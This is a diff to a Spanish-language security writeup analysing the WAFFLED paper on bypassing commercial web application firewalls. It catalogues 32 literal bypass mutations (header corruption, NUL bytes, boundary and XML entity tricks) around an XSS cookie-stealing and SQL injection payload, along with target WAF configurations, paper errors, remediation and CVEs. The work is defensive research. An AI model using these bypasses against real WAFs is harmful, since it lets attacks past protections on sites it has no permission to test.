@@ -254,57 +254,246 @@ enlace de PoC en vivo **no coinciden**. El writeup conserva ambas versiones sin 
 
 ## 11 — WAFFLED: discrepancias de parseo de contenido contra WAFs comerciales
 
-*(Sección pendiente de completar con las Tablas 3, 4 y 5 del paper — extracción en curso.)*
+**Paper:** *WAFFLED: Exploiting Parsing Discrepancies to Bypass Web Application Firewalls*.
+Akhavani, Jabiyev, Kallus, Topcuoglu, Bratus, Kirda. arXiv:2503.10846v4 (2026-03-13), CC BY 4.0.
+**Repositorio:** `github.com/sa-akhavani/waffled` — HEAD `747f79d`, MIT,
+*"Copyright (c) 2025 NEU SecLab and its affiliates."* El README del repo cita
+**ACSAC 2025, DOI 10.1109/ACSAC67867.2025.00062, pp. 689-702**; la cadena "ACSAC" **no
+aparece** en el texto del preprint de arXiv. Son el mismo trabajo por dos vías.
 
-**Fuente:** WAFFLED: *Exploiting Parsing Discrepancies to Bypass Web Application Firewalls*.
-Akhavani, Jabiyev, Kallus, Topcuoglu, Bratus, Kirda. **ACSAC 2025, pp. 689-702.**
-DOI 10.1109/ACSAC67867.2025.00062. arXiv:2503.10846, CC BY 4.0.
+> **Descargo de los autores, literal del repositorio:** *"The listed bypasses are only and
+> only for testing purposes and education purposes. We highly discourage the use of these
+> bypasses in any production environment."*
 
-### Dos correcciones a lo que se suele afirmar de este paper
+### 11.0 — Cuatro correcciones a lo que se suele afirmar de este paper
 
-**1. Los 1207 bypasses NO están publicados.** Cita literal de la sección 9: *"Sensitive
-bypass requests will remain restricted until the vulnerabilities are resolved."* Lo que el
-repo del paper publica son las **gramáticas del fuzzer**, la configuración de los WAFs y
-HTTP-Normalizer.
+**(1) Los bypasses SÍ están publicados.** Yo mismo afirmé lo contrario en el commit
+`f9262cc` y estaba equivocado. El repositorio contiene **32 peticiones de bypass
+literales**: 10 en `bypass-database/json_requests.raw`, 15 en `multipart_requests.raw`, 7
+en `xml_requests.raw`. No son los 1207 — el README precisa: *"For each bypass category, we
+provide one sample of the bypassed request."*
 
-**2. AWS no fue bypasseado — y el paper se contradice con su propio abstract.**
+**(2) La configuración de los WAFs NO está publicada**, aunque el README la anuncia. Cero
+`docker-compose`, cero Terraform, cero reglas, cero `modsecurity.conf`, cero CRS. Buscado
+por nombre de fichero y por contenido.
 
-| Fuente dentro del paper | Afirmación |
+**(3) No hay gramática `urlencoded`**, aunque el README lista
+`application/x-www-form-urlencoded` entre los content-types cubiertos y afirma *"Multiple
+grammars are provided for each content-type"*. Existen 5 gramáticas: 2 JSON, 2 multipart,
+1 XML.
+
+**(4) AWS no fue bypasseado, y el paper se contradice con su propio abstract.**
+
+| Dónde | Qué dice |
 |---|---|
 | Abstract | *"1207 bypasses across 5 well-known WAFs, AWS, Azure, Cloud Armor, Cloudflare, and ModSecurity"* |
-| Tabla 1, columna *Bypassed* | **`No` para Amazon AWS WAF**; `Yes` para los otros cuatro |
-| Sección 7.4 | *"including the lack of successful bypasses against AWS WAF"* |
-| Sección 9 (divulgación) | **omite AWS** |
+| TABLE I, columna *Bypassed* | **`No` para Amazon AWS WAF**; `Yes` para los otros cuatro |
+| §VII, párrafo *"Performance Cost"* | *"the lack of successful bypasses against AWS WAF"* |
+| §IX (divulgación) | **omite AWS** |
 
-Son **cuatro** WAFs bypasseados, no cinco.
+Son **cuatro** WAFs bypasseados, no cinco. (Y no existe una "sección 7.4": la sección VII
+no tiene subsecciones numeradas.)
 
-### Límites que cada entrada de esta sección declarará
-- **Fecha:** la Tabla 1 se encabeza *"As of July 2024."* Cloudflare *"stated that they are
-  working on a fix"*; Azure estaba retirando CRS 3.0. **La aplicabilidad actual a cualquier
-  WAF concreto no está establecida.**
-- **El paper aporta envoltorios, no payloads de ataque.** Todos usan la misma cadena XSS de
-  libro: las mutaciones se aplican *"everywhere except the attack payload itself"*.
-- `1207` aparece **antes y después** de deduplicar (§6.1) sin explicación.
-- El conteo de frameworks es inconsistente: §5.1 dice 6, §5.3 y la Tabla 2 listan 7.
+### 11.1 — Numeración de tablas y qué contienen de verdad
+
+Las 24 clases **no** están en las Tablas 3/4/5, como suele citarse:
+
+| Tabla | Contenido |
+|---|---|
+| **TABLE III** | Lista de parsers probados y sus descargas semanales *"as of July 2024"* |
+| **TABLE IV** | **12 clases multipart**, dos columnas: `Category Name` y `Request Example` |
+| **TABLE V** | **7 clases XML** |
+| **TABLE VI** | **5 clases JSON**, columna `Bypassed Request Example` |
+
+**No existe columna de WAF ni de framework en ninguna de las tres.** El mapeo clase →
+(WAF, framework) vive **solo en las Figuras 3, 4 y 5**, que son gráficos 3D de barras en
+SVG: las alturas son geometría, no texto, y **no son reconstruibles**. El único mapeo
+textual del paper es *Field Name Hack → Cloud Armor + Spring Boot*.
+
+### 11.2 — NOTA DE PROCEDENCIA que decide si los payloads funcionan
+
+El HTML del paper **no contiene ni un byte de control**. Por tanto los `\x00`, `\t` y
+`\r\n` de las tablas son **texto literal de 2-4 caracteres ASCII** (`\`+`x`+`0`+`0`), no
+bytes reales. Para reproducir hay que **emitir el byte real**.
+
+Los ficheros `.raw` del repositorio tienen la misma propiedad y es una ventaja: cada
+petición es un literal de bytes de Python en **una sola línea física**, con los CRLF
+escapados como texto. Verificado con `cat -A`: cero bytes CR reales. **No hay riesgo de
+colapso de saltos de línea.** Quien materializa los CRLF es `http-request-relay/http_relay.py`.
+
+> **Advertencia de seguridad propia (análisis, no del repo):** ese relay hace
+> `[eval(req.strip()) for req in requests]` — `eval()` sobre cada línea del fichero.
+> Ejecuta código arbitrario si el fichero se manipula. Usa `ast.literal_eval`.
+
+### 11.3 — Identificación del objetivo (criterio 2)
+
+El dataset está **anonimizado**: cero nombres de fabricante (grep en todo el repo). Lo que
+sí identifica la infraestructura:
+
+- **Literal en 3 peticiones:** `x-crs-version: 3.3.6` con `x-crs-paranoia-level: 1` y `2`.
+- **Por inferencia de `Server:`** en `output-parser/data/sample-treqs-output`:
+  `awselb/2.0` (AWS ALB), `Microsoft-Azure-Application-Gateway/v2` (Azure WAF),
+  `nginx/1.18.0 (Ubuntu)` (ModSecurity sobre NGINX), `Werkzeug/3.0.1 Python/3.10.12`
+  (el echo server Flask, no un WAF).
+- **Configuración exacta, de la TABLE I del paper, *"As of July 2024"*:** AWS WAF (ELB) +
+  AWS Managed Ruleset + OWASP CRS 3.0 · Cloudflare WAF **Pro** + Managed Ruleset + CRS ·
+  Azure WAF **V2** (Application Gateway) + CRS 3.0 · Google Cloud Armor con
+  `sqli-v33-stable` y `xss-v33-stable`, **Sensitivity Level 1** · ModSecurity sobre NGINX +
+  CRS 3.0 **Paranoia Level 1**.
+
+**Fecha:** julio 2024. Cloudflare *"stated that they are working on a fix"* y Azure estaba
+retirando CRS 3.0 hacia DRS 2.1. **La aplicabilidad actual a cualquier WAF concreto no está
+establecida.**
+
+### 11.4 — EL CONTROL NEGATIVO VIENE EN EL DATASET
+
+Esto es lo mejor del repositorio y lo que lo distingue de una lista de payloads:
+`bypass-database/detectables/` contiene las **cuatro peticiones base que SÍ se detectan**.
+
+El README lo convierte en instrucción: *"It only modifies the request structure. If you are
+testing a WAF, make sure that these attack payloads are detected by the WAF when sent in a
+normal request."*
+
+**Los propios autores exigen ejecutar el control negativo primero.** Base detectable para
+JSON, literal:
+
+```
+POST /json HTTP/1.1\r\nHost: waf.mytargetwebapp.com\r\nConnection:close\r\nUser-Agent: Mozilla/5.0\r\nX-Request-ID: 71\r\nContent-Type: application/json\r\nContent-Length: 52\r\n\r\n{"field1":"<script>alert(document.cookie)</script>"}
+```
+
+Si **esa** no se bloquea, el WAF no está inspeccionando y ningún bypass de abajo prueba
+nada. **Cada payload de esta sección es esa misma petición con una única mutación
+estructural.** El payload de ataque nunca cambia: las mutaciones se aplican *"everywhere
+except the attack payload itself"*. El paper aporta **envoltorios**, no payloads de ataque.
+
+### 11.5 — Los 32 bypasses, por mecanismo
+
+Todos sobre el mismo payload de ataque (`<script>alert(document.cookie)</script>` o
+`' and 1=1 --`). Omito las cabeceras comunes; **la mutación está marcada**.
+
+#### A — Corrupción del NOMBRE de la cabecera `Content-Type` (4)
+El WAF no reconoce el tipo, así que **no inspecciona el cuerpo**. La aplicación lo parsea
+igual porque su framework es más tolerante.
+
+| Mutación literal | Content-type | Nota |
+|---|---|---|
+| `ContentType: application/json` | JSON | **sin el guion** |
+| *(cabecera `Content-Type` ausente por completo)* | JSON | verificado con `x-crs-version: 3.3.6`, `paranoia-level: 1` |
+| `Content_-Type: multipart/form-data; boundary=real` | multipart | **guion bajo insertado** |
+| `Cntent-Type: multipart/form-data; boundary=real` | multipart | **falta la `o`**; con `x-crs-version: 3.3.6`, `paranoia-level: 1` |
+
+#### B — `Content-Type` desplazado o sin nombre de cabecera (3, todos XML)
+| Mutación literal | Nota |
+|---|---|
+| `Content-Length: 315\r\n\r\nContent-Type: application/xml\r\n\r\n<?xml ...` | **el `Content-Type` va DENTRO del cuerpo**, tras la línea en blanco |
+| `Content-Length: 307\r\napplication/xml\r\n\r\n<?xml ...` | valor **sin nombre de cabecera** |
+| `Content-Length: 307\r\napplication/xmlapplication/xml\r\n\r\n<?xml ...` | valor **duplicado** sin nombre |
+
+#### C — Alteración del VALOR del `Content-Type` (3, multipart)
+| Mutación literal | Nota |
+|---|---|
+| `Content-Type: \tmultipart/form-data; boundary*0=re;boundary*1=al` | **TAB tras los dos puntos** + continuación **RFC 2231**: `boundary*0`+`boundary*1` se concatenan a `real` |
+| `Content-Type: multipart/form-data; boundary*0=re;boundary*1=al` | solo la continuación RFC 2231 |
+| `Content-Type: multipart/form-data; boundary=real;` *(y el cuerpo arranca sin línea en blanco)* | **punto y coma final** + separador de cuerpo ausente |
+
+#### D — Byte NUL en el cuerpo JSON (3 posiciones distintas)
+```
+{"field1"\x00:"<script>alert(document.cookie)</script>"}     <- NUL entre el nombre y los dos puntos
+{"field1\x00:"<script>alert(document.cookie)</script>"}      <- NUL dentro del nombre, comilla desbalanceada
+{"f\x00eld1":"<script>alert(document.cookie)</script>"}      <- NUL en medio del nombre
+```
+El primero declara `Content-Length: 53` y los otros `52`: el NUL **cuenta como un byte**.
+Dos de los tres se verificaron contra `/spring/json`.
+
+#### E — Byte NUL en las cabeceras de parte multipart (6 posiciones)
+| Mutación literal | Dónde |
+|---|---|
+| `conten\x00-extra: something` | nombre de una cabecera de parte |
+| `content-disposition: form-da\x00a; name="field1"` | valor de `content-disposition` |
+| `Content-Type: tex\x00t/plain;charset=UTF-8` | valor del `Content-Type` de la parte |
+| `u\x00tf-8` | valor del charset **en el cuerpo** (parte `_charset_`) |
+| `content-disposition: form-data; name="field1"\x00\n` | **NUL + LF desnudo** como separador de cabecera |
+| `content-disposition: form-data; name="field1\x00"` | NUL **dentro** del nombre entrecomillado |
+
+Cinco de los seis se verificaron contra `/flask/multipart`.
+
+#### F — Manipulación del delimitador de boundary (3)
+| Mutación literal | Nota |
+|---|---|
+| `-real` *(primer delimitador)*, el resto `--real` | **un solo guion** en el primero |
+| `\r\n` *(primer delimitador eliminado entero)*, el resto `--real` | delimitador **ausente** |
+| `boundary=real\r` + `\n--real` | **CR solitario**: se elimina el `\n` del primer CRLF (*Linefeed Removal*) |
+
+#### G — Entidades, comentarios y desbalanceo en XML (4)
+Todos combinan `&gt;` + comentario + entidad declarada en el DOCTYPE:
+```
+<genre:field1 attr="history">&gt;<!--this is a comment -->&writer;' and 1=1 --</genre:field1>
+```
+con una de estas corrupciones estructurales añadidas:
+
+| Mutación | Nota |
+|---|---|
+| `]</BOOK>` | corchete de cierre de DOCTYPE **desbalanceado** al final |
+| `j</genre:schema>` | **carácter suelto** antes del cierre |
+| payload movido **fuera** de `<genre:field1>`, directo en `<BOOK>` | reubicación del payload |
+| `<!ENTITY writer "hi">` + `&writer;` adyacente al payload | la entidad parte la cadena de ataque para el WAF |
+
+### 11.6 — Las 24 clases de TABLE IV/V/VI (nombres oficiales)
+
+Nombres exactos de las 12 clases multipart, para mapear contra las mutaciones de arriba:
+`Boundary Delimiter Manipulation` · `Content-Disposition Disruption` ·
+`Distorted Header Injection to Body` · `Content-Type Tweak in Body` ·
+`Charset Value Alteration in Body` · `Header Separator Manipulation in Body` ·
+`Content-Type Parameter Tweak` · `Boundary Delimiter Removal` · `Linefeed Removal` ·
+`Whitespace Alteration` · `Disrupted Body Field` · `Boundary Header Tampering`.
+
+Leyenda de las tablas, literal del caption de TABLE IV: *"Removals are displayed with a
+strike-through text with a gray background, while additions and replacements are shown with
+only a gray background."*
+
+### 11.7 — Remediación
+
+**Del propio paper:** HTTP-Normalizer, un proxy que valida las peticiones contra los RFC
+vigentes. *"Our results demonstrate its effectiveness in normalizing or blocking all bypass
+attempts presented in this work."* Está en `http-body-normalizer/` — **en código, sin
+documentación**: su README tiene dos líneas y el README raíz admite *"Documentation Work In
+Progress"*.
+
+Es la aplicación directa del principio 0: **rechazar la ambigüedad en lugar de
+reconciliarla.** Un WAF que no reconoce un `Content-Type` debería **bloquear**, no dejar
+pasar sin inspeccionar — que es lo que hacen los cuatro bypasses del grupo A.
+
+`# [derivado]` La regla operativa para un defensor: **si el WAF no puede parsear el cuerpo,
+la petición no debe llegar al origen.** "No inspeccionado" tiene que ser un estado de
+rechazo, no de aprobación silenciosa.
+
+### 11.8 — Otras incoherencias internas del paper, registradas
+
+- `1207` aparece **antes y después** de deduplicar (§VI-A) sin explicación.
+- Conteo de frameworks inconsistente: §V-A dice 6; §V-C y la TABLE II listan 7.
 - El *"más del 90%"* se apoya en **~50 sitios**, no 100: *"We chose the first 100 search
   results... About half of these webpages were excluded."*
+- Referencia cruzada errónea: §V-E dice *"Table 4 provides the list of parsers"* cuando es
+  la TABLE III, y mezcla numeración romana y árabe en la misma frase.
+- Tres atribuciones de autoría erróneas en *Related Work*: *"Meiners et al."* [15] es
+  Nguyen et al.; *"Freiling et al."* [16] es Jana y Shmatikov; *"Dalili's work"* [18] es una
+  entrada sin autor.
+- **Cero CVEs** en todo el paper.
 
-### Lo ya extraído
-**Listing 4 — continuación de boundary (RFC 2231):**
-```
-Content-Type: multipart/form-data; boundary=fake-boundary;boundary*0=real-;boundary*1=boundary
-```
-**Tabla 5, JSON, *Field Wrapper Manipulation*:**
-```
-{ "field1" \x00: "<script>alert(document.cookie)</script>" }
-```
+### 11.9 — Bonus: CVEs reales hallados al verificar `wafrift`
 
-**Mitigación del propio paper:** HTTP-Normalizer, un proxy que valida las peticiones contra
-los RFC vigentes. *"Our results demonstrate its effectiveness in normalizing or blocking all
-bypass attempts presented in this work."* Es la aplicación del principio 0: **rechazar la
-ambigüedad en lugar de reconciliarla.**
+Descarté `wafrift` como fuente por no dar WAF con versión. **Me equivoqué en parte:** fuera
+de los dos ficheros que pedí, su código cita vulnerabilidades reales con producto, versión,
+CVE y fecha:
 
----
+| CVE | Producto | Nota |
+|---|---|---|
+| **CVE-2025-27110** | **libmodsecurity3 v3.0.13** | Regresión; corregida en **3.0.14**. Advisory de febrero 2025 |
+| **CVE-2022-39956**<br>**CVE-2022-39957** | **OWASP CRS** anterior a 3.3.3 | Corregidas en **CRS 3.3.3 / 3.2.2**, septiembre 2022 |
+
+Que una regresión en el propio motor de ModSecurity tenga CVE en 2025 es el recordatorio de
+que **el WAF también es software con parser**, y por tanto sujeto al principio 0 de este
+documento.
 
 ## 12 — Fuentes que NO entraron, y por qué
 
